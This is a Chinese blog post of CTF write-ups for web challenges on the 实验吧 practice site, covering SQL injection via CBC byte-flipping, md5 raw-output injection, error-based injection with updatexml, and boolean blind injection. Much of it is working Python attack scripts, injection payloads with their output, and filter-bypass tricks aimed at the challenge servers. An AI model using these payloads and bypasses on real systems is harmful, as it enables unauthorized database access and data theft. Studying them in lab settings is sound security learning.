<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>实验吧 Web 练习 - Lab on Mercury</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Lab on Mercury"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Lab on Mercury"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="实验吧的Web题总体比Bugku难一些，主要难度在于几道注入题。"><meta property="og:type" content="blog"><meta property="og:title" content="实验吧 Web 练习"><meta property="og:url" content="https://signormercurio.me/post/ShiYanBaWeb/"><meta property="og:site_name" content="Lab on Mercury"><meta property="og:description" content="实验吧的Web题总体比Bugku难一些，主要难度在于几道注入题。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://signormercurio.me/img/og_image.png"><meta property="article:published_time" content="2019-07-26T13:15:13.000Z"><meta property="article:author" content="Mercury"><meta property="article:tag" content="SQLi"><meta property="article:tag" content="Hash"><meta property="article:tag" content="编码"><meta property="article:tag" content="php"><meta property="article:tag" content="CBC字节翻转攻击"><meta property="article:tag" content="二次编码"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://signormercurio.me/post/ShiYanBaWeb/"},"headline":"Lab on Mercury","image":["https://signormercurio.me/img/og_image.png"],"datePublished":"2019-07-26T13:15:13.000Z","author":{"@type":"Person","name":"Mercury"},"description":"实验吧的Web题总体比Bugku难一些，主要难度在于几道注入题。"}</script><link rel="canonical" href="https://signormercurio.me/post/ShiYanBaWeb/"><link rel="alternate" href="/atom.xml" title="Lab on Mercury" type="application/atom+xml"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2019-07-26T13:15:13.000Z" title="2019-07-26T13:15:13.000Z">2019-07-26</time></span><span class="level-item"><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/">安全</a><span> / </span><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/Web/">Web</a></span><span class="level-item">33 minutes read (About 4916 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">实验吧 Web 练习</h1><div class="content"><p>实验吧的Web题总体比Bugku难一些，主要难度在于几道注入题。</p>
<a id="more"></a>

<h2 id="简单的登录题"><a href="#简单的登录题" class="headerlink" title="简单的登录题"></a>简单的登录题</h2><p>非常不友好的第一题。。</p>
<p>随便输入id发送并抓包，在请求包中的cookie中发现<code>iv</code>和<code>cipher</code>，可以确定是对称密码题。。响应头中有个提示<code>test.php</code>，访问得到一大段代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="string">&#x27;***********&#x27;</span>);</span><br><span class="line">define(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;conn.php&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqliCheck</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(preg_match(<span class="string">&quot;/\\\|,|-|#|=|~|union|like|procedure/i&quot;</span>,$str))&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $random_iv=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;<span class="number">16</span>;$i++)&#123;</span><br><span class="line">        $random_iv.=chr(rand(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params">$info</span>)</span>&#123;</span><br><span class="line">	$iv = get_random_iv();</span><br><span class="line">	$plain = serialize($info);</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);</span><br><span class="line">    setcookie(<span class="string">&quot;iv&quot;</span>, base64_encode($iv));</span><br><span class="line">    setcookie(<span class="string">&quot;cipher&quot;</span>, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">global</span> $link;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;cipher&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;iv&#x27;</span>]))&#123;</span><br><span class="line">        $cipher = base64_decode($_COOKIE[<span class="string">&#x27;cipher&#x27;</span>]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[<span class="string">&quot;iv&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))&#123;</span><br><span class="line">            $info = unserialize($plain) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;base64_decode(&#x27;&quot;</span>.base64_encode($plain).<span class="string">&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;</span>);</span><br><span class="line">            $sql=<span class="string">&quot;select * from users limit &quot;</span>.$info[<span class="string">&#x27;id&#x27;</span>].<span class="string">&quot;,0&quot;</span>;</span><br><span class="line">            $result=mysqli_query($link,$sql);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>  <span class="keyword">or</span> <span class="keyword">die</span>(mysqli_error($link)))&#123;</span><br><span class="line">            	$rows=mysqli_fetch_array($result);</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;&lt;center&gt;Hello!&#x27;</span>.$rows[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/center&gt;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">    $id = (<span class="keyword">string</span>)$_POST[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(sqliCheck($id))</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;&lt;h1 style=&#x27;color:red&#x27;&gt;&lt;center&gt;sql inject detected!&lt;/center&gt;&lt;/h1&gt;&quot;</span>);</span><br><span class="line">    $info = <span class="keyword">array</span>(<span class="string">&#x27;id&#x27;</span>=&gt;$id);</span><br><span class="line">    login($info);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;&lt;center&gt;Hello!&lt;/center&gt;&lt;/h1&gt;&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">&quot;iv&quot;</span>])&amp;&amp;<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;cipher&#x27;</span>]))&#123;</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;body class=&quot;login-body&quot; style=&quot;margin:0 auto&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;wrapper&quot; style=&quot;margin:0 auto;width:800px;&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;header&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;input id to login&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;content&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name=&quot;id&quot; type=&quot;text&quot; class=&quot;input id&quot; value=&quot;id&quot; onfocus=&quot;this.value=\&#x27;\&#x27;&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;footer&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;p&gt;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>首先会对提交的参数<code>id</code>进行过滤防止SQL注入，随后会随机生成一个<code>iv</code>，并根据序列化后的<code>id</code>生成明文并加密，加密方式为<code>aes-128-cbc</code>。容易想到CBC字节翻转攻击。<code>iv</code>和<code>cipher</code>这里都经过了base64编码。</p>
<p>如果没有提交参数<code>id</code>，则执行与上述过程相反的解密过程得到明文。如果得到的明文无法反序列化，将直接返回其base64；否则进行sql查询：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> ?,<span class="number">0</span></span><br></pre></td></tr></table></figure>
<p>这里的问号显然就是注入点了。尝试构造：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">1</span><span class="comment">#,0</span></span><br></pre></td></tr></table></figure>
<p>但是<code>#</code>和<code>--</code>两种注释符被过滤了，考虑使用<code>%00</code>。先提交：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;1;%00</span><br></pre></td></tr></table></figure>
<p>得到<code>iv</code>和<code>cipher</code>，然后设置到cookie里并去掉参数<code>id</code>再次提交，显示<code>Hello!rootzz</code>，说明注入成功。</p>
<p>这同时也说明，我们可以通过修改<code>iv</code>和<code>cipher</code>控制<code>id</code>，而<code>iv</code>和<code>cipher</code>是没有过滤的，所以可以成功绕过<code>id</code>的过滤机制。具体如何修改，也就是CBC字节翻转攻击的具体过程可以参考<a href="https://signormercurio.me/post/BugkuWeb/">我的这篇博客</a>中的最后一题。</p>
<p>例如，我们提交<code>id=12</code>，序列化后分组如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Block 0: a:1:&#123;s:2:&quot;id&quot;;s:</span><br><span class="line">Block 1: 2:&quot;12&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到，我们翻转第0组的<strong>第4字节（从0开始计数）</strong>，即可控制<code>id=12</code>中的<code>2</code>了。再比如，我们提交<code>id=0 2nion select * from ((select 1)a join (select 2)b join (select 3)c);</code>（显然这里我们可以用<code>join</code>替换逗号，并且想把<code>2</code>换成<code>u</code>来绕过检测），序列化后分组如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Block 0: a:1:&#123;s:2:&quot;id&quot;;s:</span><br><span class="line">Block 1: 70:&quot;0 2nion sele</span><br><span class="line">Block 2: ct * from ((sele</span><br><span class="line">Block 3: ct 1)a join (sel</span><br><span class="line">Block 4: ect 2)b join (se</span><br><span class="line">Block 5: lect 3)c);</span><br></pre></td></tr></table></figure>
<p>这里要翻转的变成了<strong>第6字节</strong>，而如果payload长度大于等于100，则需要翻转<strong>第7字节</strong>了。</p>
<p>此外，需要注意在payload末尾添加<code>%00</code>。如果直接添加可能会被二次URL编码，因此可以用<code>chr(0)</code>来添加。完整脚本：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>(<span class="params">payload, i, old, new</span>):</span></span><br><span class="line">    url = <span class="string">r&#x27;http://ctf5.shiyanbar.com/web/jiandan/index.php&#x27;</span></span><br><span class="line">    data = &#123;<span class="string">&#x27;id&#x27;</span>: payload&#125;</span><br><span class="line">    r = requests.post(url=url, data=data)</span><br><span class="line">    sc = r.headers[<span class="string">&#x27;Set-Cookie&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    cipher = re.findall(<span class="string">r&#x27;cipher=(.*)&#x27;</span>, sc)[<span class="number">0</span>]</span><br><span class="line">    iv = re.findall(<span class="string">r&#x27;iv=(.*),&#x27;</span>, sc)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># print(cipher)</span></span><br><span class="line">    <span class="comment"># print(iv)</span></span><br><span class="line"></span><br><span class="line">    cd = base64.b64decode(urllib.parse.unquote(cipher))</span><br><span class="line">    ivd = base64.b64decode(urllib.parse.unquote(iv))</span><br><span class="line"></span><br><span class="line">    ch = <span class="built_in">bytes</span>([cd[i] ^ <span class="built_in">ord</span>(new) ^ <span class="built_in">ord</span>(old)])</span><br><span class="line">    cd = cd[:i] + ch + cd[i+<span class="number">1</span>:]</span><br><span class="line">    cnew = urllib.parse.quote(base64.b64encode(cd))</span><br><span class="line">    <span class="comment"># print(cnew)</span></span><br><span class="line"></span><br><span class="line">    cookie0 = &#123;<span class="string">&#x27;iv&#x27;</span>: iv, <span class="string">&#x27;cipher&#x27;</span>: cnew&#125;</span><br><span class="line">    r = requests.post(url=url, cookies=cookie0)</span><br><span class="line">    plain = re.findall(<span class="string">r&quot;base64_decode\(&#x27;(.*)&#x27;\)&quot;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">    pd = base64.b64decode(plain)</span><br><span class="line"></span><br><span class="line">    block0 = <span class="string">&#x27;a:1:&#123;s:2:&quot;id&quot;;s:&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        ch = <span class="built_in">bytes</span>([ivd[i] ^ pd[i] ^ <span class="built_in">ord</span>(block0[i])]) <span class="comment"># Using bytes([int]) here is important</span></span><br><span class="line">        ivd = ivd[:i] + ch + ivd[i+<span class="number">1</span>:]</span><br><span class="line">    ivnew = urllib.parse.quote(base64.b64encode(ivd))</span><br><span class="line">    <span class="comment"># print(ivnew)</span></span><br><span class="line"></span><br><span class="line">    cookie1 = &#123;<span class="string">&#x27;iv&#x27;</span>: ivnew, <span class="string">&#x27;cipher&#x27;</span>: cnew&#125;</span><br><span class="line">    r = requests.post(url=url, cookies=cookie1)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># login(&#x27;12&#x27;, 4, &#x27;#&#x27;, &#x27;2&#x27;)</span></span><br><span class="line"><span class="comment"># login(&#x27;0 2nion select * from ((select 1)a join (select 2)b join (select 3)c);&#x27; + chr(0), 6, &#x27;2&#x27;, &#x27;u&#x27;)</span></span><br><span class="line">login(<span class="string">&#x27;0 2nion select * from ((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&#x27;</span> + <span class="built_in">chr</span>(<span class="number">0</span>), <span class="number">7</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;u&#x27;</span>)</span><br><span class="line"><span class="comment"># users, you_want</span></span><br><span class="line">login(<span class="string">&#x27;0 2nion select * from ((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &quot;you_want&quot;)b join (select 3)c);&#x27;</span> + <span class="built_in">chr</span>(<span class="number">0</span>), <span class="number">7</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;u&#x27;</span>)</span><br><span class="line"><span class="comment"># value</span></span><br><span class="line">login(<span class="string">&#x27;0 2nion select * from ((select 1)a join (select value from you_want)b join (select 3)c);&#x27;</span> + <span class="built_in">chr</span>(<span class="number">0</span>), <span class="number">6</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;u&#x27;</span>)</span><br></pre></td></tr></table></figure>


<p>忘了提及的一点是，过滤了等号，可以通过<code>regexp</code>绕过。</p>
<p>这题放在Web第一题实在是太劝退了。</p>
<h2 id="后台登录"><a href="#后台登录" class="headerlink" title="后台登录"></a>后台登录</h2><p>F12找到：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$password=$_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;</span>.md5($password,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">$result=mysqli_query($link,$sql);</span><br><span class="line">	<span class="keyword">if</span>(mysqli_num_rows($result)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;flag is :&#x27;</span>.$flag;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&#x27;密码错误!&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这里比较有意思的是在SQL注入中引入了哈希函数。其中<code>md5($password, true)</code>返回一个字符串。</p>
<p>因此我们需要构造一个字符串，使得其md5值由16进制转为字符串后，包含<code>&#39;or&#39;num</code>（<code>num</code>为任意数字），这样就可以组成SQL语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and password = &#x27;&#x27;or&#x27;num&#x27;</span><br></pre></td></tr></table></figure>
<p>例如，对于字符串<code>ffifdyop</code>，其md5值为<code>276f722736c95d99e921722cf9ed621c</code>，对应字符串开头为<code>&#39;or&#39;6</code>，因此SQL语句执行结果为<code>true</code>，成功登录。</p>
<h2 id="加了料的报错注入"><a href="#加了料的报错注入" class="headerlink" title="加了料的报错注入"></a>加了料的报错注入</h2><p>这题比较有趣的是，<code>username</code>中过滤了<code>()</code>，而<code>password</code>中过滤了很多报错注入用的函数名。因此可以考虑将两者拼接，在<code>username</code>中使用函数但把<code>()</code>移动到<code>password</code>里，最后注释掉中间的SQL语句。此外，<code>password</code>还过滤了<code>=</code>，用双重否定绕过即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&#39; and updatexml&#x2F;*&amp;password&#x3D;*&#x2F;(1,concat(0x7e,(select database()),0x7e),1) or &#39;1</span><br><span class="line"># XPATH syntax error: &#39;~error_based_hpf~&#39;</span><br><span class="line"></span><br><span class="line">username&#x3D;&#39; and updatexml&#x2F;*&amp;password&#x3D;*&#x2F;(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where !(table_schema&lt;&gt;&#39;error_based_hpf&#39;)),0x7e),1) or &#39;1</span><br><span class="line"># XPATH syntax error: &#39;~ffll44jj,users~&#39;</span><br><span class="line"></span><br><span class="line">username&#x3D;&#39; and updatexml&#x2F;*&amp;password&#x3D;*&#x2F;(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where !(table_name&lt;&gt;&#39;ffll44jj&#39;)),0x7e),1) or &#39;1</span><br><span class="line"># XPATH syntax error: &#39;~value~&#39;</span><br><span class="line"></span><br><span class="line">username&#x3D;&#39; and updatexml&#x2F;*&amp;password&#x3D;*&#x2F;(1,concat(0x7e,(select value from ffll44jj),0x7e),1) or &#39;1</span><br><span class="line"># XPATH syntax error: &#39;~flag&#123;err0r_b4sed_sqli_+_hpf&#125;~&#39;</span><br></pre></td></tr></table></figure>

<p>另外，本题也可以用<code>exp</code>和<code>extractvalue</code>函数。</p>
<h2 id="认真一点！"><a href="#认真一点！" class="headerlink" title="认真一点！"></a>认真一点！</h2><p>过滤了<code>and</code>，<code>union</code>，空格，逗号等等，<code>or</code>需要双写绕过。之后进行布尔盲注。<br>爆数据库名长度：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">success = <span class="string">&#x27;You are in&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ctf5.shiyanbar.com/web/earnest/index.php&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">  data = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&quot;0&#x27;oorr(length(database())=%s)oorr&#x27;0&quot;</span> % i&#125;</span><br><span class="line">  print(data)</span><br><span class="line">  r = requests.post(url, data=data)</span><br><span class="line">  <span class="keyword">if</span> success <span class="keyword">in</span> r.text:</span><br><span class="line">    print(<span class="string">&#x27;Finished, len = %s&#x27;</span> % i)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>得到数据库名长度为18。爆数据库名：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">success = <span class="string">&#x27;You are in&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ctf5.shiyanbar.com/web/earnest/index.php&#x27;</span></span><br><span class="line">chrset = string.digits + string.ascii_lowercase + <span class="string">&#x27;_!~&#x27;</span></span><br><span class="line">db = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">19</span>):</span><br><span class="line">  <span class="keyword">for</span> j <span class="keyword">in</span> chrset:</span><br><span class="line">    data = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&quot;0&#x27;oorr(mid(database()from(%s)foorr(1))=&#x27;%s&#x27;)oorr&#x27;0&quot;</span> % (i,j)&#125;</span><br><span class="line">    print(data)</span><br><span class="line">    r = requests.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> success <span class="keyword">in</span> r.text:</span><br><span class="line">      db += j</span><br><span class="line">      print(db)</span><br><span class="line">      <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>得到数据库名<code>ctf_sql_bool_blind</code>。爆表名长度：</p>
